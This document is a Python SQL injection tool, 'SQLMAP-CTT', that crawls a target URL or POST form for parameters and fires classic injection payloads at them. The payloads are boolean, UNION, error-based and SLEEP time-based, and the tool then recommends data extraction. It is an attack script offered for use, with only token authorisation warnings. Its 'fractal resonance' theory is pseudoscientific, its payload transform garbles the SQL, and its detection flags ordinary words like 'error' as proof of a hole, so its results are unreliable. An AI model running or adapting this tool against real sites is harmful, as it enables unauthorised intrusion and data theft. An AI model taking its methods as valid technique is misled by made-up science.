#!/usr/bin/env python3
"""
🔥 SQLMAP-CTT v2.0: Convergent Time Theory Enhanced SQL Injection
33-Layer Fractal Resonance Payload Generation & Temporal Inference
Author: CTT Research Group (SimoesCTT)
Date: 2026
FIXED VERSION WITH POST DATA SUPPORT
"""

import numpy as np
import hashlib
import time
import struct
import random
import concurrent.futures
from scipy.fft import fft, fftfreq
import requests
import json
import sys
import os
import re
import argparse
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from urllib.parse import urlparse, parse_qs, urlencode

# ============================================================================
# CTT 33-LAYER FRACTAL ENGINE v2.0
# ============================================================================
CTT_ALPHA = 0.0302011
CTT_LAYERS = 33
CTT_PRIMES = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137]

@dataclass
class CTTResult:
    """Container for CTT analysis results"""
    confidence: float
    resonance: float
    prime_resonance: bool
    dominant_frequency: float
    layer_correlation: float
    temporal_signature: str
    vulnerable: bool = False

class CTT_FractalEngine:
    def __init__(self, alpha: float = CTT_ALPHA, layers: int = CTT_LAYERS, custom_primes: List[int] = None):
        self.alpha = alpha
        self.layers = layers
        
        # Use custom primes if provided, otherwise default
        if custom_primes:
            self.primes = custom_primes[:layers]
        else:
            self.primes = [p for p in CTT_PRIMES if p < 100][:layers]
        
        # Initialize 33-layer resonance matrix
        self.layer_weights = np.exp(-self.alpha * np.arange(self.layers))
        self.layer_phases = np.exp(2j * np.pi * np.arange(self.layers) / self.layers)
        
        # Fractal resonance cache
        self.resonance_cache: Dict[int, List[float]] = {}
        self.temporal_patterns: Dict[int, np.ndarray] = {}
        
        # Resonance frequency (optional)
        self.resonance_freq = 587000  # Default resonance frequency
        
        # Generate initial patterns
        self._initialize_patterns()
    
    def set_resonance_frequency(self, freq: float):
        """Set custom resonance frequency"""
        self.resonance_freq = freq
    
    def _initialize_patterns(self) -> None:
        """Initialize temporal patterns for each layer"""
        for layer in range(self.layers):
            pattern = []
            for i in range(10):  # 10 sample points
                # Use resonance frequency if set
                if self.resonance_freq > 0:
                    freq_component = np.sin(2 * np.pi * i / (self.resonance_freq / 1000))
                else:
                    freq_component = 0
                
                value = np.sin(2 * np.pi * i / (self.primes[layer] if layer < len(self.primes) else 13))
                value += self.alpha * layer * np.cos(2 * np.pi * i / 13)
                value += freq_component * 0.1  # Add resonance frequency component
                pattern.append(value)
            self.temporal_patterns[layer] = np.array(pattern)
    
    def generate_fractal_payload(self, base_payload: bytes, target_layer: Optional[int] = None) -> List[bytes] | bytes:
        """
        Generate 33-layer fractal payload with temporal resonance
        """
        if target_layer is None:
            fractal_payloads = []
            for layer in range(self.layers):
                payload = self._apply_layer_resonance(base_payload, layer)
                fractal_payloads.append(payload)
            return fractal_payloads
        else:
            layer = target_layer % self.layers
            return self._apply_layer_resonance(base_payload, layer)
    
    def _apply_layer_resonance(self, payload: bytes, layer: int) -> bytes:
        """Apply layer-specific resonance transformations"""
        if layer >= len(self.primes):
            prime = 13  # Fallback prime
        else:
            prime = self.primes[layer]
        
        # Alpha-dispersion encoding
        dispersed = bytearray()
        for i, byte in enumerate(payload):
            # Apply fractal transformation with resonance frequency
            transform = (
                byte ^ 
                ((prime * int(1/self.alpha)) & 0xFF) ^
                ((layer * 137) & 0xFF) ^
                ((int(self.resonance_freq) >> (i % 8)) & 0xFF)
            )
            dispersed.append(transform % 256)
        
        # Add resonance watermark
        watermark = self._generate_resonance_watermark(layer)
        dispersed.extend(watermark)
        
        # Apply temporal padding based on layer weight
        padding_size = max(1, int(self.layer_weights[layer] * 50))
        dispersed.extend(os.urandom(padding_size))
        
        return bytes(dispersed)
    
    def _generate_resonance_watermark(self, layer: int) -> bytes:
        """Generate unique resonance watermark for each layer"""
        if layer >= len(self.primes):
            prime = 13
        else:
            prime = self.primes[layer]
            
        seed = f"{layer}{prime}{time.time():.6f}{self.alpha}{self.resonance_freq}"
        hash_digest = hashlib.sha256(seed.encode()).digest()[:16]
        
        # Encode with layer-specific prime and resonance frequency
        watermark = bytearray()
        for i, byte in enumerate(hash_digest):
            encoded = (byte + prime + layer + (int(self.resonance_freq) & 0xFF)) % 256
            watermark.append(encoded)
        
        return bytes(watermark)

# ============================================================================
# 33-LAYER SQL INJECTION ENGINE WITH POST DATA SUPPORT
# ============================================================================
class CTT_SQLInjectionEngine:
    def __init__(self, target_url: str, timeout: int = 10, alpha: float = 0.0302011, 
                 custom_primes: List[int] = None, resonance_freq: float = 587000,
                 temporal_threads: int = 11, post_data: Optional[str] = None):
        self.target_url = target_url
        self.timeout = timeout
        self.temporal_threads = temporal_threads
        self.post_data_str = post_data
        
        # Parse POST data if provided
        self.post_data_dict = {}
        if post_data:
            # Parse key=value&key2=value2 format
            try:
                from urllib.parse import parse_qs
                # parse_qs returns lists for each key, we just want single values
                parsed = parse_qs(post_data)
                for key, values in parsed.items():
                    if values:
                        self.post_data_dict[key] = values[0]
                print(f"[+] Parsed POST data: {len(self.post_data_dict)} parameters")
            except Exception as e:
                print(f"[!] Failed to parse POST data: {e}")
        
        # Initialize CTT engine with custom parameters
        self.fractal_engine = CTT_FractalEngine(
            alpha=alpha,
            layers=33,
            custom_primes=custom_primes
        )
        self.fractal_engine.set_resonance_frequency(resonance_freq)
        
        # Session with improved headers
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 CTT/2.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        # Attack state
        self.injection_points: List[Dict] = []
        self.successful_payloads: Dict[str, Dict] = {}
        self.temporal_signatures: Dict[str, Dict] = {}
        self.layer_performance = {layer: 0.0 for layer in range(33)}
        
        # Statistics
        self.stats = {
            'requests': 0,
            'injections': 0,
            'successful': 0,
            'layers_used': set(),
            'primes_used': set(),
            'start_time': time.time(),
            'alpha': alpha,
            'resonance_freq': resonance_freq,
            'threads': temporal_threads,
            'method': 'POST' if post_data else 'GET/AUTO'
        }
        
        # Cache original response
        self.original_response: Optional[requests.Response] = None
    
    def get_original_response(self) -> Optional[requests.Response]:
        """Get and cache original response"""
        if self.original_response is None:
            try:
                if self.post_data_dict:
                    # Send POST request with original data
                    self.original_response = self.session.post(
                        self.target_url, 
                        data=self.post_data_dict,
                        timeout=self.timeout
                    )
                    print(f"[+] Initial POST request sent with {len(self.post_data_dict)} parameters")
                else:
                    # Send GET request
                    self.original_response = self.session.get(self.target_url, timeout=self.timeout)
                self.stats['requests'] += 1
            except Exception as e:
                print(f"[!] Failed to get original response: {e}")
        return self.original_response
    
    def discover_injection_points(self) -> List[Dict]:
        """Discover potential injection points from URL, forms, and POST data"""
        injection_points = []
        
        try:
            # 1. Parse URL for GET parameters
            parsed = urlparse(self.target_url)
            query_params = parse_qs(parsed.query)
            
            for param in query_params:
                injection_points.append({
                    'parameter': param,
                    'value': query_params[param][0],
                    'type': 'GET',
                    'context': f"URL parameter in {self.target_url}"
                })
            
            # 2. Add POST data parameters if provided
            for param, value in self.post_data_dict.items():
                injection_points.append({
                    'parameter': param,
                    'value': value,
                    'type': 'POST',
                    'context': f"POST parameter '{param}'"
                })
            
            # 3. Try to get page and look for forms (if no POST data specified)
            if not self.post_data_dict:
                response = self.get_original_response()
                if response and response.status_code == 200:
                    # Simple form detection
                    form_patterns = [
                        r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>',
                        r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>',
                        r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>'
                    ]
                    
                    for pattern in form_patterns:
                        matches = re.findall(pattern, response.text, re.IGNORECASE)
                        for match in matches:
                            injection_points.append({
                                'parameter': match,
                                'value': 'test',
                                'type': 'POST',
                                'context': f"Form field '{match}'"
                            })
            
            print(f"[+] Discovered {len(injection_points)} total injection points")
            
        except Exception as e:
            print(f"[!] Error discovering injection points: {e}")
        
        return injection_points
    
    def test_injection_point(self, param_name: str, param_value: str, method: str = 'GET') -> List[Dict]:
        """Test injection point with CTT-enhanced payloads using temporal threads"""
        results = []
        
        # Select layers to test (use prime layers for resonance)
        target_layers = [0, 7, 13, 19, 29]  # Strategic CTT layers
        
        print(f"[+] Testing {param_name} with {len(target_layers)} CTT layers using {self.temporal_threads} threads")
        
        # Use ThreadPoolExecutor for parallel testing
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.temporal_threads) as executor:
            future_to_layer = {}
            
            for layer in target_layers:
                # Submit testing task for each layer
                future = executor.submit(
                    self._test_layer,
                    param_name,
                    param_value,
                    method,
                    layer
                )
                future_to_layer[future] = layer
            
            # Collect results as they complete
            for future in concurrent.futures.as_completed(future_to_layer):
                layer = future_to_layer[future]
                try:
                    layer_results = future.result()
                    results.extend(layer_results)
                except Exception as e:
                    print(f"[!] Layer {layer} test failed: {e}")
        
        return results
    
    def _test_layer(self, param_name: str, param_value: str, method: str, layer: int) -> List[Dict]:
        """Test a specific CTT layer"""
        results = []
        
        # Generate and test payloads for this layer
        payloads = self._generate_sqli_payloads(param_value, layer)
        
        for payload_idx, payload in enumerate(payloads[:3]):  # Test first 3 per layer
            try:
                # Generate fractal payload
                fractal_payload = self.fractal_engine.generate_fractal_payload(
                    payload.encode('utf-8', errors='ignore'), 
                    layer
                )
                
                # Send request
                start_time = time.time()
                response = self._send_request(param_name, fractal_payload.decode('utf-8', errors='ignore'), method, layer)
                response_time = time.time() - start_time
                
                if response:
                    # Analyze response
                    detection = self._detect_injection(response, response_time, layer)
                    
                    result = {
                        'layer': layer,
                        'payload': payload[:50] + "..." if len(payload) > 50 else payload,
                        'response_time': response_time,
                        'status_code': response.status_code,
                        'vulnerable': detection['vulnerable'],
                        'confidence': detection['confidence'],
                        'prime_layer': layer in self.fractal_engine.primes,
                        'signature': detection['signature']
                    }
                    
                    if detection['vulnerable']:
                        # Store successful payload
                        key = f"{param_name}_{layer}_{payload_idx}"
                        self.successful_payloads[key] = {
                            'layer': layer,
                            'payload': payload,
                            'response_time': response_time,
                            'confidence': detection['confidence'],
                            'signature': detection['signature']
                        }
                        self.layer_performance[layer] += detection['confidence']
                        self.stats['successful'] += 1
                        
                        if layer in self.fractal_engine.primes:
                            self.stats['primes_used'].add(layer)
                    
                    results.append(result)
                    self.stats['injections'] += 1
                    
                    # Respectful delay based on layer weight
                    time.sleep(self.fractal_engine.layer_weights[layer] * 0.1)
                
            except Exception as e:
                print(f"[Layer {layer}] Error: {e}")
                continue
        
        self.stats['layers_used'].add(layer)
        return results
    
    def _generate_sqli_payloads(self, base_value: str, layer: int) -> List[str]:
        """Generate SQL injection payloads with CTT resonance"""
        payloads = []
        
        # Base payloads
        templates = [
            f"{base_value}'",
            f"{base_value}' OR '1'='1",
            f"{base_value}' AND '1'='1",
            f"{base_value}' UNION SELECT NULL,NULL--",
            f"{base_value}' AND 1=1--",
            f"{base_value}' OR 1=1--",
            f"{base_value}\"'\"",  # Add quote testing
            f"{base_value})",  # Add parenthesis testing
        ]
        
        # Add CTT-enhanced payloads
        if layer in self.fractal_engine.primes:
            # Prime layers get resonance-enhanced payloads
            sleep_time = 1 + (layer % 3)
            templates.extend([
                f"{base_value}' AND SLEEP({sleep_time})--",
                f"{base_value}' OR SLEEP({sleep_time})--",
                f"{base_value}' AND 1=CONVERT(int, @@version)--",
                f"{base_value}' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
                f"{base_value}' UNION SELECT @@version,NULL--",
                f"{base_value}' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
            ])
        
        return templates
    
    def _send_request(self, param_name: str, payload: str, method: str, layer: int) -> Optional[requests.Response]:
        """Send HTTP request with CTT timing"""
        try:
            # Add CTT timing delay based on layer
            delay = self.fractal_engine.layer_weights[layer] * 0.05
            time.sleep(delay)
            
            if method.upper() == 'POST' or self.post_data_dict:
                # For POST, we need to update the data dictionary
                data_dict = self.post_data_dict.copy() if self.post_data_dict else {}
                data_dict[param_name] = payload
                
                # Send POST request
                response = self.session.post(self.target_url, data=data_dict, timeout=self.timeout)
            else:
                # For GET, parse and modify URL
                parsed = urlparse(self.target_url)
                query_dict = parse_qs(parsed.query)
                query_dict[param_name] = [payload]
                
                # Rebuild URL
                new_query = urlencode(query_dict, doseq=True)
                new_url = parsed._replace(query=new_query).geturl()
                
                response = self.session.get(new_url, timeout=self.timeout)
            
            self.stats['requests'] += 1
            return response
            
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed for layer {layer}: {e}")
            return None
    
    def _detect_injection(self, response: requests.Response, response_time: float, layer: int) -> Dict[str, Any]:
        """Detect SQL injection vulnerability with CTT resonance analysis"""
        detection_signals = []
        
        # 1. Check for SQL errors
        sql_errors = [
            'sql', 'mysql', 'oracle', 'postgres', 'syntax',
            'database', 'query', 'odbc', 'driver', 'procedure',
            'unclosed', 'quotation', 'invalid', 'error',
            'warning', 'mysql_', 'you have an error', 'sqlite',
            'microsoft', 'odbc', 'pdo', 'exception'
        ]
        
        response_lower = response.text.lower()
        for error in sql_errors:
            if error in response_lower:
                detection_signals.append(('sql_error', 0.8))
                break
        
        # 2. Check response time (for time-based)
        if response_time > 2.0:  # Significant delay
            detection_signals.append(('time_delay', 0.7))
        
        # 3. Compare with original response
        original = self.get_original_response()
        if original and original.status_code == 200 and response.status_code == 200:
            length_diff = abs(len(response.text) - len(original.text))
            if length_diff > len(original.text) * 0.5:  # > 50% difference
                detection_signals.append(('boolean_diff', 0.6))
        
        # 4. Check for union patterns
        if 'null' in response_lower or 'union' in response_lower:
            detection_signals.append(('union', 0.9))
        
        # 5. Check for database output
        db_patterns = ['root@', 'localhost', 'version()', '@@version', 'information_schema']
        for pattern in db_patterns:
            if pattern in response.text:
                detection_signals.append(('db_output', 0.85))
                break
        
        # 6. CTT resonance bonus
        if layer in self.fractal_engine.primes:
            detection_signals.append(('prime_resonance', 0.3))
        
        # 7. Resonance frequency detection
        if self.fractal_engine.resonance_freq > 0:
            # Check if response contains patterns related to resonance
            freq_str = str(self.fractal_engine.resonance_freq)
            if any(freq_str[i:i+3] in response.text for i in range(len(freq_str)-2)):
                detection_signals.append(('resonance_pattern', 0.2))
        
        # Calculate confidence
        if detection_signals:
            confidence = min(sum(signal[1] for signal in detection_signals), 1.0)
            signature = hashlib.md5(
                '_'.join([sig[0] for sig in detection_signals]).encode()
            ).hexdigest()[:8]
            
            self.temporal_signatures[signature] = {
                'layer': layer,
                'response_time': response_time,
                'signals': detection_signals,
                'confidence': confidence
            }
            
            vulnerable = confidence >= 0.5  # Lower threshold for better detection
            
            return {
                'vulnerable': vulnerable,
                'confidence': confidence,
                'signature': signature,
                'signals': detection_signals
            }
        
        return {
            'vulnerable': False,
            'confidence': 0.0,
            'signature': '',
            'signals': []
        }
    
    def generate_report(self) -> Dict[str, Any]:
        """Generate comprehensive CTT report"""
        total_time = time.time() - self.stats['start_time']
        
        # Calculate effectiveness
        effectiveness = 0.0
        if self.stats['injections'] > 0:
            effectiveness = self.stats['successful'] / self.stats['injections']
        
        # Find best layer
        best_layer = -1
        best_performance = 0.0
        for layer, perf in self.layer_performance.items():
            if perf > best_performance:
                best_performance = perf
                best_layer = layer
        
        return {
            'target': self.target_url,
            'timestamp': time.time(),
            'total_time': total_time,
            'statistics': self.stats,
            'effectiveness': effectiveness,
            'best_layer': best_layer,
            'best_layer_performance': best_performance,
            'successful_payloads_count': len(self.successful_payloads),
            'temporal_signatures_count': len(self.temporal_signatures),
            'ctt_parameters': {
                'alpha': self.fractal_engine.alpha,
                'resonance_freq': self.fractal_engine.resonance_freq,
                'primes_used': list(self.fractal_engine.primes),
                'layers': self.fractal_engine.layers
            },
            'recommendations': self._get_recommendations()
        }
    
    def _get_recommendations(self) -> List[str]:
        """Get CTT-enhanced attack recommendations"""
        recommendations = []
        
        if self.stats['successful'] > 0:
            recommendations.append("✅ CTT vulnerabilities detected - proceed with fractal data extraction")
            
            # Check what type of vulnerabilities
            vuln_types = set()
            for sig in self.temporal_signatures.values():
                for signal in sig.get('signals', []):
                    vuln_types.add(signal[0])
            
            if 'time_delay' in vuln_types:
                recommendations.append("⏱️  Time-based SQLi detected - use SLEEP() with CTT resonance")
            if 'sql_error' in vuln_types:
                recommendations.append("🚨 Error-based SQLi detected - use verbose error extraction with α-dispersion")
            if 'union' in vuln_types:
                recommendations.append("🔗 UNION-based SQLi detected - direct data extraction possible")
            if 'db_output' in vuln_types:
                recommendations.append("💾 Database output detected - can extract data directly")
            if 'prime_resonance' in vuln_types:
                recommendations.append("⚡ Prime resonance detected - optimize for prime layers")
            if 'resonance_pattern' in vuln_types:
                recommendations.append("🎵 Resonance patterns detected - frequency tuning successful")
            
            # Layer recommendation
            best_layer = max(self.layer_performance.items(), key=lambda x: x[1])[0]
            recommendations.append(f"🎯 Most effective CTT layer: {best_layer}")
            
            if best_layer in self.fractal_engine.primes:
                recommendations.append("⚡ Prime layer shows strong resonance - prioritize for advanced attacks")
        else:
            recommendations.append("❌ No CTT vulnerabilities detected with current parameters")
            recommendations.append("💡 Try adjusting α, resonance frequency, or prime selection")
        
        # CTT-specific recommendations
        recommendations.append(f"🔧 CTT Alpha (α): {self.fractal_engine.alpha}")
        recommendations.append(f"🎵 Resonance Frequency: {self.fractal_engine.resonance_freq} Hz")
        recommendations.append(f"🔢 Primes used: {len(self.fractal_engine.primes)}")
        recommendations.append(f"📤 Request Method: {self.stats['method']}")
        recommendations.append("🔒 Test only on authorized systems with proper consent")
        
        return recommendations

# ============================================================================
# MAIN INTERFACE WITH ARGPARSE - FIXED WITH POST DATA SUPPORT
# ============================================================================
def main():
    parser = argparse.ArgumentParser(
        description='SQLMAP-CTT v2.0: 33-Layer Fractal Resonance SQL Injection',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s -u "http://test.com/page?id=1"
  %(prog)s -u "http://test.com/search" --data "q=test&submit=go" --ctt-alpha=0.0302011
  %(prog)s -u "http://test.com/" --data "searchFor=test&goButton=go" --resonance-freq=587000
  %(prog)s -u "http://test.com/" --temporal-threads=11 --timeout=20 --data "param=value"
        '''
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('--data', type=str, default='', 
                       help='POST data (e.g., "param1=value1&param2=value2")')
    parser.add_argument('--ctt-alpha', type=float, default=0.0302011, 
                       help='CTT temporal dispersion coefficient (default: 0.0302011)')
    parser.add_argument('--ctt-primes', type=str, default='',
                       help='Custom prime numbers for resonance (comma-separated)')
    parser.add_argument('--resonance-freq', type=float, default=587000,
                       help='Resonance frequency in Hz (default: 587000)')
    parser.add_argument('--temporal-threads', type=int, default=11,
                       help='Number of temporal threads (default: 11)')
    parser.add_argument('--timeout', type=int, default=15,
                       help='Request timeout in seconds (default: 15)')
    parser.add_argument('--output', type=str, default='',
                       help='Output file for report (default: auto-generated)')
    
    args = parser.parse_args()
    
    # Parse custom primes
    custom_primes = []
    if args.ctt_primes:
        try:
            custom_primes = [int(p.strip()) for p in args.ctt_primes.split(',')]
            print(f"[+] Using custom primes: {custom_primes[:5]}...")
        except ValueError:
            print(f"[!] Invalid primes format. Using default primes.")
            custom_primes = None
    
    print(r"""
     _____ _____ __  __    _    ____ _____ 
    / ____/ ____|  \/  |  / \  / ___|_   _|
   | (___| (___ | \  / | / _ \| |     | |  
    \___ \\___ \| |\/| |/ ___ \ |___  | |  
     ____) |___) | |  | /_/   \_\____| |_  
    |_____/_____/|_|  |_|      CTT v2.0
    
    33-Layer Fractal SQL Injection Engine
    Convergent Time Theory Enhanced
    """)
    
    print(f"[+] Target URL: {args.url}")
    print(f"[+] CTT Configuration:")
    print(f"    • Alpha (α): {args.ctt_alpha}")
    print(f"    • Resonance Frequency: {args.resonance_freq} Hz")
    print(f"    • Temporal Threads: {args.temporal_threads}")
    print(f"    • Custom Primes: {'Yes' if custom_primes else 'No'}")
    print(f"    • Timeout: {args.timeout}s")
    if args.data:
        print(f"    • POST Data: {args.data[:50]}...")
    else:
        print(f"    • Method: GET (auto-detect)")
    print("-" * 60)
    
    try:
        # Initialize CTT engine with custom parameters
        engine = CTT_SQLInjectionEngine(
            target_url=args.url,
            timeout=args.timeout,
            alpha=args.ctt_alpha,
            custom_primes=custom_primes,
            resonance_freq=args.resonance_freq,
            temporal_threads=args.temporal_threads,
            post_data=args.data if args.data else None
        )
        
        # Discover injection points
        print("[+] Discovering injection points...")
        injection_points = engine.discover_injection_points()
        
        if not injection_points:
            print("[!] No injection points found.")
            print("[!] Try specifying parameters in URL or with --data")
            print("[!] Examples:")
            print("    http://site.com/page?param=value")
            print("    --data \"param1=value1&param2=value2\"")
            sys.exit(1)
        
        print(f"[+] Found {len(injection_points)} potential injection points")
        
        # Test each injection point
        all_results = []
        for i, point in enumerate(injection_points):
            print(f"\n[{i+1}/{len(injection_points)}] Testing: {point['parameter']} ({point['type']})")
            print(f"    Context: {point['context']}")
            print(f"    Original value: {point['value'][:30]}..." if len(point['value']) > 30 else f"    Original value: {point['value']}")
            
            results = engine.test_injection_point(
                point['parameter'], 
                point['value'], 
                point['type']
            )
            
            # Summarize results for this parameter
            vulnerable = any(r['vulnerable'] for r in results)
            if vulnerable:
                vuln_count = sum(1 for r in results if r['vulnerable'])
                best_conf = max(r['confidence'] for r in results if r['vulnerable'])
                print(f"    ✅ CTT VULNERABILITY DETECTED! ({vuln_count} payloads, max confidence: {best_conf:.2f})")
            else:
                print(f"    ❌ No vulnerability detected")
            
            all_results.extend(results)
        
        # Generate final report
        print("\n" + "=" * 60)
        print("CTT SQL INJECTION REPORT")
        print("=" * 60)
        
        report = engine.generate_report()
        
        print(f"Target: {report['target']}")
        print(f"Time elapsed: {report['total_time']:.1f}s")
        print(f"Requests made: {report['statistics']['requests']}")
        print(f"Injection attempts: {report['statistics']['injections']}")
        print(f"Successful CTT detections: {report['statistics']['successful']}")
        print(f"Effectiveness: {report['effectiveness']:.1%}")
        print(f"CTT Parameters:")
        print(f"  • Alpha: {report['ctt_parameters']['alpha']}")
        print(f"  • Resonance Frequency: {report['ctt_parameters']['resonance_freq']} Hz")
        print(f"  • Primes Used: {len(report['ctt_parameters']['primes_used'])}")
        print(f"  • Method: {report['statistics']['method']}")
        
        if report['best_layer'] >= 0:
            print(f"Best CTT layer: {report['best_layer']} (performance: {report['best_layer_performance']:.2f})")
        
        print(f"\nRecommendations:")
        for rec in report['recommendations']:
            print(f"  {rec}")
        
        # Save report
        if args.output:
            report_file = args.output
        else:
            timestamp = int(time.time())
            report_file = f"ctt_sqli_report_{timestamp}.json"
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        print(f"\n[+] Detailed CTT report saved to: {report_file}")
        
        # Show successful payloads if any
        if engine.successful_payloads:
            print(f"\n[+] Successful CTT Payloads ({len(engine.successful_payloads)}):")
            for i, (key, payload) in enumerate(list(engine.successful_payloads.items())[:3]):
                print(f"  {i+1}. Layer {payload['layer']}: {payload['payload'][:60]}...")
                print(f"     Confidence: {payload['confidence']:.2f}, Time: {payload['response_time']:.2f}s")
        
        # Final CTT notes
        print("\n" + "=" * 60)
        print("CTT TECHNOLOGY NOTES:")
        print("=" * 60)
        print("1. CTT uses 33-layer fractal resonance for enhanced detection")
        print("2. Alpha (α) controls temporal dispersion in payloads")
        print("3. Prime numbers create resonance patterns in network traffic")
        print("4. Resonance frequency tunes detection to specific patterns")
        print("5. Temporal threads enable parallel layer testing")
        print("=" * 60)
        print("⚠️  AUTHORIZED USE ONLY - RESPONSIBLE DISCLOSURE REQUIRED")
        print("=" * 60)
        
    except KeyboardInterrupt:
        print("\n[!] CTT scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] CTT fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    # Check for required packages
    try:
        import numpy
        import scipy
        import requests
    except ImportError as e:
        print(f"[!] Missing required package: {e}")
        print("[!] Install with: pip install numpy scipy requests")
        sys.exit(1)
    
    main()
